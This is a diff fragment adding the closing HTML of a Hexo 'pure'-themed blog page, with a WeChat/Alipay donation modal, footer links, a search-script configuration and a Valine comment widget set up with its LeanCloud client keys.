+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/yejuns" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'z6IxiHbvPL5ILrUKq4XWV0py-gzGzoHsz',
+    appKey: 'MqpLIyiIaepCg2gruAt2hAEY',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
